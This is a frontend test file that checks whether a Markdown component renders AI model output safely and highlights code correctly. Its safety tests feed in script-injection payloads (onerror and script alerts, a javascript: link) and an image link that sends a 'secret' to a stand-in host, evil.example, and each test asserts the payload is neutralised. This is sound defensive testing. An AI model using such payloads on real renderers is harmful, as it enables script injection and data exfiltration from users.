import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { Markdown } from "../components/Markdown";

describe("Markdown safety", () => {
  it("renders raw HTML in model output as text, not as elements", () => {
    const { container } = render(<Markdown text={'<img src=x onerror="alert(1)"> <script>alert(2)</script>'} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
  });

  it("does not load remote images", () => {
    const { container } = render(<Markdown text={"![leak](https://evil.example/p.png?secret=1)"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("image not loaded");
  });

  it("does not render images from any URL in model text", () => {
    // react-markdown's URL sanitiser drops data: URLs; that is stricter than needed and fine.
    const { container } = render(<Markdown text={"![ok](data:image/png;base64,iVBORw0KGgo=)"} />);
    expect(container.querySelector("img[src^='http']")).toBeNull();
  });

  it("links never become anchors that navigate the app", () => {
    const { container } = render(<Markdown text={"[click](https://example.com/a) [js](javascript:alert(1))"} />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("click");
    expect(container.textContent).toContain("js");
  });
});

describe("Markdown code highlighting", () => {
  it("highlights a fenced block that names a language, as elements", () => {
    const { container } = render(<Markdown text={"```js\nconst x = 'a'; // note\n```"} />);
    expect(container.querySelector("pre code.hljs.language-js")).not.toBeNull();
    expect(container.querySelector("span.hljs-keyword")?.textContent).toBe("const");
    expect(container.querySelector("span.hljs-string")?.textContent).toBe("'a'");
    expect(container.querySelector("span.hljs-comment")?.textContent).toBe("// note");
    expect(container.textContent).toContain("const x = 'a'; // note");
  });

  it("does not guess the language of a block without a tag", () => {
    const { container } = render(<Markdown text={"```\nconst x = 1;\n```"} />);
    expect(container.querySelector("[class*='hljs']")).toBeNull();
    expect(container.textContent).toContain("const x = 1;");
  });

  it("shows a block in an unknown language as plain text", () => {
    const { container } = render(<Markdown text={"```no-such-language\nconst x = 1;\n```"} />);
    expect(container.querySelector("[class*='hljs-']")).toBeNull();
    expect(container.textContent).toContain("const x = 1;");
  });

  it("leaves inline code alone", () => {
    const { container } = render(<Markdown text={"Use `const x = 1` here."} />);
    expect(container.querySelector("[class*='hljs']")).toBeNull();
  });

  it("keeps HTML inside a highlighted block as text", () => {
    const { container } = render(
      <Markdown text={"```html\n<script>alert(1)</script><img src=x onerror=\"alert(2)\">\n```"} />,
    );
    expect(container.querySelector("span.hljs-tag")).not.toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("<script>alert(1)</script>");
  });
});
